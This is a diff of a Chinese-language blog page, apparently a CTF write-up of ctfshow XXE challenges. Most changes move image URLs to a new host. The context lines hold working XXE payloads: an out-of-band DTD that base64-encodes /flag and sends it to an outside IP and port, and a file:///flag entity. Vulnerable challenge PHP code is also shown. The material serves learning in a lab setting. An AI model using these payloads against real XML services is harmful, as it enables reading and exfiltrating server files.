@@ -27,24 +27,24 @@
 <meta property="og:site_name" content="blueSatchel&#39;s blog">
 <meta property="og:description" content="一些xxe题目实践">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://gitee.com/blue_satchel/images/raw/master/image-20220110180025568.png">
-<meta property="og:image" content="https://gitee.com/blue_satchel/images/raw/master/image-20220110180342295.png">
-<meta property="og:image" content="https://gitee.com/blue_satchel/images/raw/master/image-20220110182024289.png">
-<meta property="og:image" content="https://gitee.com/blue_satchel/images/raw/master/image-20220110183234994.png">
-<meta property="og:image" content="https://gitee.com/blue_satchel/images/raw/master/image-20220110183404676.png">
-<meta property="og:image" content="https://gitee.com/blue_satchel/images/raw/master/image-20220110183422805.png">
-<meta property="og:image" content="https://gitee.com/blue_satchel/images/raw/master/image-20220110183448490.png">
-<meta property="og:image" content="https://gitee.com/blue_satchel/images/raw/master/image-20220110185118318.png">
-<meta property="og:image" content="https://gitee.com/blue_satchel/images/raw/master/image-20220110185242294.png">
-<meta property="og:image" content="https://gitee.com/blue_satchel/images/raw/master/image-20220110205856482.png">
-<meta property="og:image" content="https://gitee.com/blue_satchel/images/raw/master/image-20220110205445709.png">
+<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110180025568.png">
+<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110180342295.png">
+<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110182024289.png">
+<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110183234994.png">
+<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110183404676.png">
+<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110183422805.png">
+<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110183448490.png">
+<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110185118318.png">
+<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110185242294.png">
+<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110205856482.png">
+<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110205445709.png">
 <meta property="article:published_time" content="2021-12-25T05:06:11.000Z">
-<meta property="article:modified_time" content="2022-01-11T05:04:01.526Z">
+<meta property="article:modified_time" content="2022-03-25T09:18:46.913Z">
 <meta property="article:author" content="blueSatchel">
 <meta property="article:tag" content="xxe">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://gitee.com/blue_satchel/images/raw/master/image-20220110180025568.png">
+<meta name="twitter:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110180025568.png">
 
 <link rel="canonical" href="http://example.com/2021/12/25/xxe%E9%A2%98%E7%9B%AE/">
 
@@ -237,7 +237,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-01-11 13:04:01" itemprop="dateModified" datetime="2022-01-11T13:04:01+08:00">2022-01-11</time>
+                <time title="修改时间：2022-03-25 17:18:46" itemprop="dateModified" datetime="2022-03-25T17:18:46+08:00">2022-03-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -304,14 +304,14 @@
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%xxe;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>服务端给了这样的回显,说明是没有使用php协议,当成了路径,仔细一想,应该使用另一个实体来替换后面的伪协议内容</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220110180025568.png" alt="image-20220110180025568"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110180025568.png" alt="image-20220110180025568"></p>
 <p> 更改后的dtd文档</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % b SYSTEM &quot;http://121.40.113.226:5555/%file;&quot;&gt;</span><br><span class="line">%b;</span><br></pre></td></tr></table></figure>
 
 <p>这次服务端回显了200,说明有成功请求到dtd文档,但是忘了一个问题,这里的file变量需要读取的内容在靶机上,而我这样写就是读取攻击机的内容了……</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220110180342295.png" alt="image-20220110180342295"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110180342295.png" alt="image-20220110180342295"></p>
 <p>查看了别人写的payload,明白了基本原理:利用xml的变量机制,把请求路径转换成通过base64编码的文件内容,所以得到的返回值是404</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220110182024289.png" alt="image-20220110182024289"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110182024289.png" alt="image-20220110182024289"></p>
 <h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><p>xml</p>
 <p>xml通过前面的尝试已经完全理解了</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">aaa</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%aaa;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>123<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -323,19 +323,19 @@
 <p>第一个就是为什么要将%进行编码为<code>&amp;#x25;</code>,我的理解是实体里面包含实体因为引号的原因,需要将其进行编码,我又进行了尝试,将第一个%也编码成<code>&amp;#x25;</code>,未成功</p>
 <p>第二个是为什么要实体里面包含实体,不能直接执行</p>
 <p><code>&lt;!ENTITY % xxe  SYSTEM &quot;http://121.40.113.226:5555/%file;&quot;&gt;  %xxe;</code></p>
-<p>但是如果写成这样,请求的路径就还是dtd文档了<img src="https://gitee.com/blue_satchel/images/raw/master/image-20220110183234994.png" alt="image-20220110183234994"></p>
+<p>但是如果写成这样,请求的路径就还是dtd文档了<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110183234994.png" alt="image-20220110183234994"></p>
 <p>在尝试中一个偶然的错误让我有了启发,—-我忘记给dtd中的url加端口了</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220110183404676.png" alt="image-20220110183404676"></p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220110183422805.png" alt="image-20220110183422805"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110183404676.png" alt="image-20220110183404676"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110183422805.png" alt="image-20220110183422805"></p>
 <p>此时的请求路径还是dtd文档,那也就是说,之前所有请求文档的都是因为%aaa和dtd文档的错误书写</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220110183448490.png" alt="image-20220110183448490"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110183448490.png" alt="image-20220110183448490"></p>
 <p>在dtd中如果颠倒%dtd和%xxe的顺序,请求路径还是dtd文档</p>
 <p>突然看到用payload的时候请求信息是两条,</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220110185118318.png" alt="image-20220110185118318"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110185118318.png" alt="image-20220110185118318"></p>
 <p>然后将dtd文档改成</p>
 <p><code>&lt;!ENTITY % xxe  SYSTEM &#39;http://121.40.113.226:5555/1;&#39;&gt; %xxe;</code></p>
 <p>请求路径还是两条</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220110185242294.png" alt="image-20220110185242294"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110185242294.png" alt="image-20220110185242294"></p>
 <p>这个时候突然恍然大悟,为什么要用外部实体包裹它呢,是因为单个实体无法使用%file对路径进行替换,<laber style="color:red">真正发请求的还是%xxe</label>,用%dtd包裹它就可以使用%file对其进行替换,所以是先执行%dtd再执行%xxe</p>
 <h3 id="ctfshow-web-375"><a href="#ctfshow-web-375" class="headerlink" title="ctfshow web 375"></a>ctfshow web 375</h3><p>题目代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>
@@ -356,11 +356,11 @@
 
 <p>有个疑问:用web377用python转换成utf-16编码后post包用burp抓住后,里面还是包含http字符串的,咋就绕过了呢</p>
 <p>这个是用burp抓的python发的包</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220110205856482.png" alt="image-20220110205856482"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110205856482.png" alt="image-20220110205856482"></p>
 <h3 id="ctfshow-web-378"><a href="#ctfshow-web-378" class="headerlink" title="ctfshow web 378"></a>ctfshow web 378</h3><h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>这道题的payload很简单,但是起初我一直抓不到发给dologin的数据包,这是为何????,但是后面又抓到了…..</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220110205445709.png" alt="image-20220110205445709"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110205445709.png" alt="image-20220110205445709"></p>
 
     </div>
 
